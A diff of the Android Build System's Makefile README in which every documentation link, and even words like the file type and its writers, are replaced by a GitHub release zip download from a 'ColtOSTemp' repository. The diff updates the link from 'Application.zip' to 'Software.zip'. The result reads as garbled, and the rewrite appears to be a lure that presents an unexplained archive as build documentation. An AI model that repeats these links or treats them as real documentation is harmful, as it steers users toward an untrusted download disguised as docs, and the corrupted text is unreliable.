@@ -2,14 +2,14 @@
 
 This is the Makefile-based portion of the Android Build System.
 
-For documentation on how to run a build, see [https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip)
+For documentation on how to run a build, see [https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip)
 
-For a list of behavioral changes useful for https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip writers see
-[https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip)
+For a list of behavioral changes useful for https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip writers see
+[https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip)
 
-For an outdated reference on https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip files, see
-[https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip). Our https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip files look similar,
-but are entirely different from the https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip files used by the NDK build
+For an outdated reference on https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip files, see
+[https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip). Our https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip files look similar,
+but are entirely different from the https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip files used by the NDK build
 system. When searching for documentation elsewhere, ensure that it is for the
 platform build system -- most are not.
 
@@ -19,5 +19,5 @@ are read by [Kati], and generate a ninja file instead of being executed
 directly. That's combined with a ninja file read by Soong so that the build
 graph of the two systems can be combined and run as one.
 
-[Kati]: https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip
-[Soong]: https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip+/master
+[Kati]: https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip
+[Soong]: https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip+/master
